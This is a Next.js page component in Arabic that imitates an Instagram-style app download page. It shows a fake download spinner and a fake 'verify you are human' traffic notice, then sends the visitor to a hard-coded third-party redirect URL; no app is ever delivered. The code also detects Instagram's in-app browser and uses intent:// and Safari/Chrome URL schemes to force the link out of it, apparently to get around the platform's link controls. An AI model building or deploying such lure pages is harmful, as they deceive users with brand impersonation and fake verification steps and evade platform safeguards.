"use client";

import { useState, useEffect } from "react";
import Image from "next/image";

// Configure your redirect URL here
const REDIRECT_URL = "https://crn77.com/4/8978669"; // Change this to your desired URL

export default function Home() {
  const [stage, setStage] = useState<
    "initial" | "loading" | "verification" | "final-loading"
  >("initial");

  const isInstagramInAppBrowser = () => {
    if (typeof navigator === "undefined") return false;
    return /Instagram/i.test(navigator.userAgent);
  };

  const openInExternalBrowser = (url: string) => {
    if (typeof window === "undefined") return;

    const ua = navigator.userAgent || "";
    const isAndroid = /Android/i.test(ua);
    const isIOS = /iPhone|iPad|iPod/i.test(ua);

    if (isAndroid) {
      const cleanUrl = url.replace(/^https?:\/\//, "");
      const fallback = encodeURIComponent(url);
      window.location.href = `intent://${cleanUrl}#Intent;scheme=https;package=com.android.chrome;S.browser_fallback_url=${fallback};end`;
      return;
    }

    if (isIOS) {
      const cleanUrl = url.replace(/^https?:\/\//, "");
      window.location.href = `googlechrome://${cleanUrl}`;
      setTimeout(() => {
        window.location.href = `x-safari-https://${cleanUrl}`;
      }, 250);
      setTimeout(() => {
        window.location.href = url;
      }, 1200);
      return;
    }

    const opened = window.open(url, "_blank", "noopener,noreferrer");
    if (!opened || opened.closed || typeof opened.closed === "undefined") {
      window.location.href = url;
    }
  };

  useEffect(() => {
    if (isInstagramInAppBrowser()) {
      openInExternalBrowser(window.location.href);
    }
  }, []);

  useEffect(() => {
    if (stage === "loading") {
      // Wait 2 seconds after clicking download
      const timer = setTimeout(() => {
        setStage("verification");
      }, 2000);
      return () => clearTimeout(timer);
    } else if (stage === "verification") {
      // Wait 3 seconds before redirecting
      const timer = setTimeout(() => {
        setStage("final-loading");
      }, 3000);
      return () => clearTimeout(timer);
    } else if (stage === "final-loading") {
      const timer = setTimeout(() => {
        openInExternalBrowser(REDIRECT_URL);
      }, 1500);
      return () => clearTimeout(timer);
    }
  }, [stage]);

  const handleDownloadClick = () => {
    if (isInstagramInAppBrowser()) {
      openInExternalBrowser(REDIRECT_URL);
      return;
    }
    setStage("loading");
  };

  return (
    <div
      className="flex min-h-screen items-center justify-center bg-linear-to-br from-purple-600 via-pink-500 to-orange-400"
      dir="rtl"
    >
      <main className="flex flex-col items-center justify-center px-8 py-16 text-center">
        {stage === "initial" && (
          <div className="animate-fade-in">
            <div className="mb-8">
              <div className="mx-auto w-24 h-24 rounded-3xl shadow-2xl flex items-center justify-center mb-6 overflow-hidden">
                <Image
                  src="/lo.webp"
                  alt="Unstagram Logo"
                  width={96}
                  height={96}
                  className="w-full h-full object-cover"
                />
              </div>
              <h1 className="text-5xl font-bold text-white mb-4 drop-shadow-lg font-cairo">
                قم بتحميل أحدث تطبيق
              </h1>
              <p className="text-xl text-white/90 mb-8 font-cairo">
                احصل على أفضل تجربة لمشاركة الصور والفيديوهات
              </p>
            </div>
            <button
              onClick={handleDownloadClick}
              className="bg-white text-purple-600 px-12 py-4 rounded-full text-xl font-bold shadow-2xl hover:shadow-3xl hover:scale-105 transition-all duration-300 hover:bg-purple-50 font-cairo"
            >
              تحميل التطبيق الآن
            </button>
          </div>
        )}

        {stage === "loading" && (
          <div className="animate-fade-in">
            <div className="w-20 h-20 border-8 border-white border-t-transparent rounded-full animate-spin mb-6"></div>
            <p className="text-2xl text-white font-semibold font-cairo">
              جاري التحميل...
            </p>
          </div>
        )}

        {stage === "verification" && (
          <div className="animate-fade-in bg-white rounded-3xl p-10 shadow-2xl max-w-md">
            <div className="w-16 h-16 bg-yellow-400 rounded-full flex items-center justify-center mx-auto mb-6">
              <svg
                className="w-10 h-10 text-white"
                fill="currentColor"
                viewBox="0 0 24 24"
              >
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
              </svg>
            </div>
            <h2 className="text-3xl font-bold text-gray-800 mb-4 font-cairo">
              يجب التحقق من أنك إنسان
            </h2>
            <p className="text-lg text-gray-600 leading-relaxed font-cairo">
              نحن نتلقى الكثير من الزيارات في الوقت الحالي. يرجى الانتظار للتحقق
              من هويتك...
            </p>
            <div className="mt-6 flex justify-center gap-2">
              <div className="w-3 h-3 bg-purple-600 rounded-full animate-bounce"></div>
              <div
                className="w-3 h-3 bg-purple-600 rounded-full animate-bounce"
                style={{ animationDelay: "0.1s" }}
              ></div>
              <div
                className="w-3 h-3 bg-purple-600 rounded-full animate-bounce"
                style={{ animationDelay: "0.2s" }}
              ></div>
            </div>
          </div>
        )}

        {stage === "final-loading" && (
          <div className="animate-fade-in">
            <div className="w-20 h-20 border-8 border-white border-t-transparent rounded-full animate-spin mb-6"></div>
            <p className="text-2xl text-white font-semibold font-cairo">
              جاري إعادة التوجيه...
            </p>
          </div>
        )}
      </main>
    </div>
  );
}
